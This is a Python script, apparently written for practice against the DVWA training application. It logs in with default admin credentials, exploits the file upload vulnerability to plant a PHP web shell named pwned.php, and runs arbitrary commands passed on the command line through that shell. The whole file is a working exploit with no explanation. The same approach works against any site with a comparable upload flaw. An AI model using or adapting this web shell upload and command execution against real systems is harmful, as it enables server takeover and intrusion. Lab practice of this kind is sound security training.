import requests
import time
import sys

print(sys.argv[1])

proxyDict = { 
              "http"  : 'http://127.0.0.1:8080', 
              "https" : 'https://127.0.0.1:8080'
            }



host = sys.argv[1]
command = sys.argv[2]

s = requests.Session()
data = {
    'username': 'admin',
    'password':'admin',
    'Login':'Login'
}

# login
r = s.post(host + '/dvwa/login.php',data=data)


if 'Login' in r.text:
    print('[!] login failed!')
else:
    print('[+] Login successful!')

# ------- END LOGIN ---------------

def uploadMultipart():
    url = host + '/dvwa/vulnerabilities/upload/'

    file_data = {
      'MAX_FILE_SIZE': (None, "100000"),
      'uploaded': ('pwned.php', "<?php System($_GET['cmd']) ?>"),
      'Upload': (None, "Upload")
    }
    r = s.post(url,files = file_data,proxies=proxyDict)

    if 'pwned.php' in r.text:
        print('[+] Shell uploaded successfully!')
    else:
        print('[!] Error!')

uploadMultipart()

def execCMD(com):
    url = host + '/dvwa/hackable/uploads/pwned.php'
    payload = {
        'cmd':com
    }
    r = s.get(url,params=payload,proxies=proxyDict)
    print(r.text)

execCMD(command)
